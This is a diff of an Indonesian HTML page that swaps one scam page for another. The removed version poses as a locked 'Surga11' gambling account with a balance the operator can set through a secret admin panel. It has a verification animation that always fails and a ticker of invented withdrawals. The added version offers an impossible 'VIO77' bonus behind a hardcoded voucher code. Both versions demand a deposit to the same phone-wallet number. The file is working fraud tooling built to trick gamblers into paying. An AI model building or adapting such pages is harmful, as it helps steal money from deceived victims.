@@ -2,350 +2,278 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
+<title>CLAIM BONUS VIO77</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Sistem Verifikasi Surga11</title>
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 <style>
-    /* CSS ASLI TANPA PERUBAHAN */
-    * {margin:0; padding:0; box-sizing:border-box;}
-    
-    body {
-        height: 100vh;
-        font-family: 'Inter', sans-serif;
-        background: #000;
-        color: #fff;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        overflow: hidden;
-    }
+*{box-sizing:border-box;font-family:Segoe UI,Tahoma}
+body{
+    margin:0;
+    background:linear-gradient(135deg,#020924,#050f45);
+    color:#fff;
+}
+.page{display:none;min-height:100vh;padding:20px}
+.page.active{display:block}
 
-    .card {
-        width: 90%;
-        max-width: 380px;
-        background: #121212;
-        border: 1px solid #333;
-        border-radius: 25px;
-        padding: 30px 20px;
-        text-align: center;
-        position: relative;
-    }
+/* CARD */
+.card{
+    max-width:520px;
+    margin:50px auto;
+    background:#0a1340;
+    padding:25px;
+    border-radius:18px;
+    box-shadow:0 0 30px rgba(0,180,255,.4);
+}
+.card-wide{max-width:900px}
 
-    .icon-wrapper {
-        position: relative;
-        display: inline-block;
-        margin-bottom: 15px;
-        cursor: pointer;
-    }
-    .top-icon {
-        font-size: 55px;
-        color: #ff4500;
-        animation: pulseShield 2s infinite;
-    }
-    .notif-dot {
-        position: absolute;
-        top: 5px;
-        right: 5px;
-        width: 14px;
-        height: 14px;
-        background: #ff0000;
-        border-radius: 50%;
-        border: 2px solid #121212;
-    }
-    @keyframes pulseShield {
-        0%, 100% { transform: scale(1); filter: drop-shadow(0 0 5px #ff4500); }
-        50% { transform: scale(1.05); filter: drop-shadow(0 0 15px #ff4500); }
-    }
+/* HEADER */
+h1{text-align:center;color:#00eaff}
+h2{text-align:center;color:#ffd700}
 
-    h1 { font-size: 24px; font-weight: 800; color: #ffd700; letter-spacing: 3px; margin-bottom: 5px; }
+/* SERVER */
+.server{
+    display:flex;justify-content:center;gap:8px;margin-bottom:8px
+}
+.dot{
+    width:10px;height:10px;border-radius:50%;
+    background:#00ff6a;animation:pulse 1s infinite
+}
+@keyframes pulse{
+    0%{box-shadow:0 0 0 0 rgba(0,255,106,.7)}
+    70%{box-shadow:0 0 0 14px rgba(0,255,106,0)}
+    100%{box-shadow:0 0 0 0 rgba(0,255,106,0)}
+}
 
-    .status-box { 
-        font-size: 11px; 
-        font-weight: 900; 
-        color: #ff4500; 
-        text-transform: uppercase; 
-        margin-bottom: 20px; 
-        letter-spacing: 2px;
-        animation: alertBlink 1s infinite;
-    }
-    @keyframes alertBlink {
-        0%, 100% { color: #ff4500; text-shadow: 0 0 5px #ff4500; }
-        50% { color: #fff; text-shadow: 0 0 15px #ff4500; }
-    }
+.time{text-align:center;font-size:13px;color:#aaccff;margin-bottom:15px}
 
-    .message { font-size: 13px; line-height: 1.6; color: #aaa; margin-bottom: 20px; }
+/* FORM */
+label{display:block;margin-top:15px}
+input{
+    width:100%;padding:12px;border-radius:8px;
+    border:none;background:#111c5a;color:#fff;margin-top:6px
+}
+button{
+    width:100%;margin-top:20px;padding:14px;
+    border:none;border-radius:12px;
+    background:linear-gradient(135deg,#00c6ff,#0072ff);
+    color:#fff;font-size:16px;cursor:pointer
+}
+.loading{
+    display:none;text-align:center;margin-top:15px;
+    color:#ffd700;animation:blink 1.2s infinite
+}
+@keyframes blink{50%{opacity:.4}}
 
-    .balance-card {
-        background: linear-gradient(180deg, #0d47a1, #1976d2);
-        border-radius: 15px; padding: 18px; margin-bottom: 25px;
-        border: 1px solid rgba(255,255,255,0.1);
-    }
-    
-    .user-id-display {
-        font-size: 11px;
-        font-weight: 800;
-        color: #ffd700;
-        background: rgba(0,0,0,0.3);
-        display: inline-block;
-        padding: 4px 12px;
-        border-radius: 20px;
-        margin-bottom: 10px;
-        text-transform: uppercase;
-        letter-spacing: 1px;
-    }
-    .balance-label { font-size: 9px; text-transform: uppercase; color: rgba(255,255,255,0.7); margin-bottom: 5px; }
-    .balance-value { font-size: 22px; font-weight: 700; margin-bottom: 10px; }
+/* BONUS */
+.user{text-align:center;margin:15px 0;font-size:16px}
+.bonus{
+    background:#101a5a;
+    padding:16px;
+    border-radius:14px;
+    margin-top:14px;
+    border-left:6px solid #00eaff;
+    cursor:pointer;
+    transition:.3s;
+}
+.bonus:hover{
+    transform:scale(1.02);
+    box-shadow:0 0 18px rgba(0,200,255,.6);
+}
+.note{
+    margin-top:20px;
+    background:#2a1a00;
+    padding:15px;
+    border-radius:12px;
+    color:#ffd37a;
+    font-size:14px;
+}
 
-    .realtime-clock {
-        font-size: 10px;
-        color: rgba(255, 255, 255, 0.8);
-        font-family: 'Courier New', Courier, monospace;
-        border-top: 1px solid rgba(255, 255, 255, 0.2);
-        padding-top: 8px;
-        display: block;
-    }
+/* BANK */
+.banks{
+    margin-top:25px;
+    display:flex;justify-content:center;
+    flex-wrap:wrap;gap:12px
+}
+.bank{
+    width:100px;height:40px;
+    background:#fff;color:#003366;
+    font-weight:bold;
+    display:flex;align-items:center;justify-content:center;
+    border-radius:8px;
+}
 
-    .btn { width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 15px; font-weight: 700; cursor: pointer; text-decoration: none; display: flex; align-items: center; justify-content: center; margin-bottom: 12px; }
-    .btn-gold { background: #ffd700; color: #000; }
-    .btn-outline { background: transparent; color: #00c853; border: 1px solid #00c853; font-size: 12px; text-transform: uppercase; }
+/* PAYMENT */
+.pay-box{
+    background:#0c1a4a;
+    padding:20px;
+    border-radius:16px;
+    text-align:center;
+}
+.success{
+    color:#00ff6a;
+    font-size:18px;
+    margin-bottom:10px;
+}
+.wait{
+    margin-top:15px;
+    color:#ffd700;
+    animation:blink 1s infinite;
+    font-size:15px;
+}
 
-    .admin-panel {
-        display: none;
-        position: fixed;
-        inset: 0;
-        background: rgba(0,0,0,0.95);
-        z-index: 3000;
-        flex-direction: column;
-        justify-content: center;
-        align-items: center;
-        padding: 20px;
-    }
-    .admin-box {
-        background: #222;
-        padding: 20px;
-        border-radius: 15px;
-        width: 100%;
-        max-width: 300px;
-        border: 1px solid #ffd700;
-    }
-    .admin-box input {
-        width: 100%;
-        padding: 10px;
-        margin: 10px 0;
-        border-radius: 5px;
-        border: 1px solid #444;
-        background: #111;
-        color: #fff;
-    }
-    .admin-close {
-        color: #ff4500;
-        font-size: 12px;
-        cursor: pointer;
-        margin-top: 15px;
-        text-decoration: underline;
-    }
-
-    .ssl-secured {
-        display: flex; justify-content: center; align-items: center; gap: 8px;
-        font-size: 10px; color: #555; text-transform: uppercase; margin-top: 10px; margin-bottom: 20px;
-    }
-    .ssl-secured i { color: #00c853; }
-
-    .pay-icons { display: flex; justify-content: center; gap: 20px; opacity: 0.3; font-size: 20px; }
-
-    #loadingOverlay {
-        display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 2000;
-        flex-direction: column; justify-content: center; align-items: center;
-    }
-    .radar { width: 80px; height: 80px; border: 2px solid #ffd700; border-radius: 50%; position: relative; margin-bottom: 20px; }
-    .radar::after { content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: conic-gradient(from 0deg, transparent, rgba(255, 215, 0, 0.4)); border-radius: 50%; animation: rot 1s linear infinite; }
-    @keyframes rot { to { transform: rotate(360deg); } }
-
-    .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 999; justify-content: center; align-items: center; }
-    .modal-box { background: #111; padding: 25px; border-radius: 15px; border: 1px solid #ffd700; text-align: center; width: 85%; max-width: 320px; }
-    .btn-ok { background: transparent; color: #007bff; border: none; font-size: 17px; font-weight: bold; float: right; margin-top: 5px; cursor: pointer; }
-
-    .footer { position: fixed; bottom: 0; left: 0; width: 100%; height: 40px; background: #000; display: flex; align-items: center; border-top: 1px solid #ff4500; overflow: hidden; }
-    .scroller { white-space: nowrap; position: absolute; animation: move 120s linear infinite; color: #ff4500; font-weight: 700; font-size: 12px; }
-    @keyframes move { from { transform: translateX(0); } to { transform: translateX(-50%); } }
+/* LOGIN BUTTON */
+.login-btn{
+    display:block;
+    margin-top:25px;
+    padding:14px;
+    border-radius:12px;
+    text-decoration:none;
+    background:linear-gradient(135deg,#00ffcc,#00b894);
+    color:#002b2b;
+    font-weight:bold;
+    transition:.3s;
+}
+.login-btn:hover{
+    transform:scale(1.05);
+    box-shadow:0 0 20px rgba(0,255,204,.6);
+}
 </style>
 </head>
+
 <body>
 
-<div class="admin-panel" id="adminPanel">
-    <div class="admin-box">
-        <h2 style="color:#ffd700; font-size:16px; margin-bottom:10px;">ADMIN PANEL</h2>
-        <label style="font-size:10px;">UBAH USER ID:</label>
-        <input type="text" id="inputUser" placeholder="Contoh: kenzo283">
-        <label style="font-size:10px;">UBAH SALDO:</label>
-        <input type="text" id="inputSaldo" placeholder="Contoh: 3.150.275,00">
-        <button class="btn btn-gold" style="padding:10px; font-size:12px;" onclick="updateDataRealtime()">UPDATE DATA</button>
-        <center><div class="admin-close" onclick="closeAdmin()">Tutup Panel</div></center>
-    </div>
-</div>
-
-<div id="loadingOverlay">
-    <div class="radar"></div>
-    <div id="loadText" style="color:#ffd700; font-weight:bold;">MENGHUBUNGKAN...</div>
-</div>
-
+<!-- PAGE 1 -->
+<div class="page active" id="page1">
 <div class="card">
-    <div class="icon-wrapper" onclick="handleSecretClick()">
-        <i class="fas fa-shield-alt top-icon"></i>
-        <div class="notif-dot"></div>
-    </div>
-    <h1>SURGA11</h1>
-    <div class="status-box">Status Akun Terkunci</div>
-    
-    <div class="message">Akun anda belum memiliki riwayat deposit claim bonus, segera lakukan deposit minimal 1x Rp 100.000 untuk membuka dan mengaktifkan kembali akun anda.</div>
+<h1>CLAIM BONUS VIO77</h1>
 
-    <div class="balance-card">
-        <div class="user-id-display" id="displayId">ID: KENZO283</div>
-        <div class="balance-label">JUMLAH SALDO ANDA</div>
-        <div class="balance-value" id="displaySaldo">Rp 3.150.275,00</div>
-        <div id="liveTime" class="realtime-clock">Memuat waktu...</div>
-    </div>
-    
-    <button class="btn btn-gold" onclick="showModal('payModal', true)">Verifikasi & Buka Kunci</button>
-    <a href="https://l4.surga11-login.com/register" class="btn btn-outline">Kembali Login ke Surga11</a>
-
-    <div class="ssl-secured">
-        <i class="fas fa-lock"></i> SECURED BY 256-BIT SSL ENCRYPTION
-    </div>
-
-    <div class="pay-icons">
-        <i class="fa-solid fa-qrcode"></i>
-        <i class="fa-solid fa-building-columns"></i>
-        <i class="fa-solid fa-wallet"></i>
-        <i class="fa-brands fa-cc-visa"></i>
-    </div>
+<div class="server">
+<div class="dot"></div><div>SERVER ONLINE</div>
 </div>
 
-<div class="modal" id="payModal">
-    <div class="modal-box">
-        <h2 style="color:#ffd700; font-size:16px; margin-bottom:15px;">METODE VERIFIKASI</h2>
-        <div style="background:#ffd700; color:#000; padding:5px; border-radius:5px; font-size:10px; font-weight:900; margin-bottom:10px;">TUJUAN DEPOSIT ANDA</div>
-        <div style="background:#222; padding:15px; border-radius:10px; color:#ff3d00; font-weight:bold; font-size:24px; border:1px dashed #ffd700; margin-bottom:20px;">083194887061</div>
-        <button class="btn btn-gold" onclick="processValidation()">SAYA SUDAH TRANSFER</button>
-    </div>
+<div class="time" id="time1"></div>
+
+<label>User ID</label>
+<input type="text" id="userid" placeholder="Masukan User ID">
+
+<label>Kode Pocer</label>
+<input type="password" id="pocer" placeholder="••••••••">
+
+<button onclick="validasi()">VALIDASI & CLAIM</button>
+<div class="loading" id="loading1">Memvalidasi data server...</div>
+</div>
 </div>
 
-<div class="modal" id="errorModal">
-    <div class="modal-box" style="background:#fff; color:#000; text-align:left; border:none;">
-        <h2 style="font-size:18px; border-bottom:1px solid #eee; padding-bottom:10px; margin-bottom:15px;">Info Akun Surga 11</h2>
-        <p style="font-size: 14px; color: #333; margin-bottom: 15px;">Mohon maaf, system belum mendeteksi deposit anda. Silahkan deposit kembali.</p>
-        <button class="btn-ok" onclick="showModal('errorModal', false)">OKE</button>
-        <div style="clear:both;"></div>
-    </div>
+<!-- PAGE 2 -->
+<div class="page" id="page2">
+<div class="card card-wide">
+<h2>CLAIM BONUS VIO77</h2>
+
+<div class="server">
+<div class="dot"></div><div>SERVER ONLINE</div>
 </div>
 
-<div class="footer"><div class="scroller" id="scrollText"></div></div>
+<div class="time" id="time2"></div>
+
+<div class="user">User ID: <b id="showUser"></b></div>
+
+<div class="bonus" onclick="pilihBonus()">
+Deposit BUG <b>Rp 100.000</b><br>
+Bonus <b>Rp 1.400.000</b><br>
+<b>BEBAS WD</b>
+</div>
+
+<div class="bonus" onclick="pilihBonus()">
+Deposit BUG <b>Rp 150.000</b><br>
+Bonus <b>Rp 2.400.000</b><br>
+<b>BEBAS WD</b>
+</div>
+
+<div class="note">
+<b>CATATAN :</b>
+<ul>
+<li>BONUS DI BERIKAN DI DEPAN</li>
+<li>BONUS LANGSUNG BISA WD ATAU DI MAINKAN</li>
+<li>APABILA BONUS DI MAINKAN LALU RUNGKAT MAKA BONUS TIDAK BISA DI CLAIM 2X</li>
+</ul>
+</div>
+
+<div class="banks">
+<div class="bank">BCA</div>
+<div class="bank">BRI</div>
+<div class="bank">BNI</div>
+<div class="bank">MANDIRI</div>
+<div class="bank">DANA</div>
+<div class="bank">OVO</div>
+</div>
+</div>
+</div>
+
+<!-- PAGE 3 -->
+<div class="page" id="page3">
+<div class="card">
+<h2>PROSES CLAIM BONUS</h2>
+
+<div class="pay-box">
+<div class="success">✅ Bonus berhasil di claim</div>
+
+<div>
+Sebelum sistem memasukan bonus ke akun anda,<br>
+silahkan lakukan <b>Deposit BUG</b>
+</div>
+
+<hr style="margin:15px 0;border-color:#334">
+
+<b>Metode Pembayaran</b><br><br>
+<div class="bank" style="margin:auto">DANA</div>
+
+<p style="margin-top:10px;font-size:18px">
+<b>083194887061</b>
+</p>
+
+<div class="wait">
+⏳ STATUS : MENUNGGU PEMBAYARAN<br>
+🔄 Sistem sedang memproses
+</div>
+
+<!-- TOMBOL LOGIN -->
+<a class="login-btn" href="https://vio77a.digital/account/login">
+🔐 KEMBALI LOGIN KE AKUN ANDA
+</a>
+
+</div>
+</div>
+</div>
 
 <script>
-    // FITUR BARU: AUTO AMBIL DATA DARI LINK URL
-    function checkUrlParams() {
-        const urlParams = new URLSearchParams(window.location.search);
-        const userParam = urlParams.get('user');
-        const saldoParam = urlParams.get('saldo');
+function realtime(id){
+function u(){
+const d=new Date();
+const h=["Minggu","Senin","Selasa","Rabu","Kamis","Jumat","Sabtu"];
+document.getElementById(id).innerHTML=
+h[d.getDay()]+" | "+d.toLocaleDateString("id-ID")+" | "+d.toLocaleTimeString("id-ID");
+}
+setInterval(u,1000);u();
+}
+realtime("time1");realtime("time2");
 
-        if (userParam) {
-            document.getElementById('displayId').innerText = "ID: " + userParam.toUpperCase();
-        }
-        if (saldoParam) {
-            let formatSaldo = saldoParam;
-            if (!formatSaldo.includes("Rp")) formatSaldo = "Rp " + formatSaldo;
-            document.getElementById('displaySaldo').innerText = formatSaldo;
-        }
-    }
-    // Jalankan fungsi saat web dibuka
-    window.addEventListener('load', checkUrlParams);
+function validasi(){
+const u=document.getElementById("userid").value;
+const k=document.getElementById("pocer").value;
+if(u===""){alert("User ID wajib diisi");return;}
+if(k!=="YWIRI718"){alert("Kode Pocer Tidak Valid");return;}
+document.getElementById("loading1").style.display="block";
+setTimeout(()=>{
+document.getElementById("showUser").innerText=u;
+document.getElementById("page1").classList.remove("active");
+document.getElementById("page2").classList.add("active");
+},2000);
+}
 
-    // LOGIKA ADMIN PANEL (KLIK 5X)
-    let clickCount = 0;
-    function handleSecretClick() {
-        clickCount++;
-        if (clickCount === 5) {
-            let pass = prompt("Masukkan Password Admin:");
-            if (pass === "surga11") {
-                document.getElementById('adminPanel').style.display = 'flex';
-            } else {
-                alert("Password Salah!");
-            }
-            clickCount = 0;
-        }
-        setTimeout(() => { clickCount = 0; }, 2000);
-    }
-
-    function closeAdmin() {
-        document.getElementById('adminPanel').style.display = 'none';
-    }
-
-    function updateDataRealtime() {
-        let newId = document.getElementById('inputUser').value;
-        let newSaldo = document.getElementById('inputSaldo').value;
-
-        if (newId) {
-            document.getElementById('displayId').innerText = "ID: " + newId.toUpperCase();
-        }
-        if (newSaldo) {
-            if (!newSaldo.includes("Rp")) newSaldo = "Rp " + newSaldo;
-            document.getElementById('displaySaldo').innerText = newSaldo;
-        }
-        closeAdmin();
-    }
-
-    // FUNGSI WAKTU REAL-TIME (WIB)
-    function updateClock() {
-        const now = new Date();
-        const days = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
-        const months = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"];
-        const dayName = days[now.getDay()];
-        const date = now.getDate();
-        const month = months[now.getMonth()];
-        const year = now.getFullYear();
-        const hours = String(now.getHours()).padStart(2, '0');
-        const minutes = String(now.getMinutes()).padStart(2, '0');
-        const seconds = String(now.getSeconds()).padStart(2, '0');
-        const timeString = `${dayName}, ${date} ${month} ${year} | ${hours}:${minutes}:${seconds} WIB`;
-        document.getElementById('liveTime').innerText = timeString;
-    }
-    setInterval(updateClock, 1000);
-    updateClock();
-
-    function showModal(id, x) { document.getElementById(id).style.display = x ? 'flex' : 'none'; }
-
-    // PROSES VALIDASI DENGAN LOADING RADAR
-    function processValidation() {
-        showModal('payModal', false);
-        document.getElementById('loadingOverlay').style.display = 'flex';
-        setTimeout(() => { document.getElementById('loadText').innerText = "MENGECEK MUTASI BANK..."; }, 1500);
-        setTimeout(() => { document.getElementById('loadText').innerText = "SINKRONISASI DATABASE..."; }, 3000);
-        setTimeout(() => { document.getElementById('loadingOverlay').style.display = 'none'; showModal('errorModal', true); }, 4000);
-    }
-
-    // RUNNING TEXT (HISTORY WD)
-    function initHistory() {
-        const names = ["Eka","Budi","Sari","Agus","Dewi","Rudi","Maya","Dwi","Ayu","Rian","Lina","Yoga","Fajar","Nina","Andi","Santi","Deni","Heri","Rizki","Putra","Bayu","Indah","Putri","Dimas","Wati","Joko","Ani","Bambang","Ratna","Slamet"];
-        let savedData = sessionStorage.getItem('historyData');
-        if (!savedData) {
-            let str = "";
-            for (let i = names.length - 1; i > 0; i--) {
-                const j = Math.floor(Math.random() * (i + 1));
-                [names[i], names[j]] = [names[j], names[i]];
-            }
-            names.forEach((name, index) => {
-                let id = Math.floor(Math.random() * 899) + 100;
-                let baseWd = (index * 1200000) + (Math.floor(Math.random() * 800000)) + 3000000;
-                let val = new Intl.NumberFormat('id-ID').format(baseWd);
-                str += `&bull; ${name}${id} SUCCESS WD Rp ${val} &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; `;
-            });
-            sessionStorage.setItem('historyData', str);
-            document.getElementById('scrollText').innerHTML = str + str;
-        } else {
-            document.getElementById('scrollText').innerHTML = savedData + savedData;
-        }
-    }
-    initHistory();
+function pilihBonus(){
+document.getElementById("page2").classList.remove("active");
+document.getElementById("page3").classList.add("active");
+}
 </script>
+
 </body>
 </html>
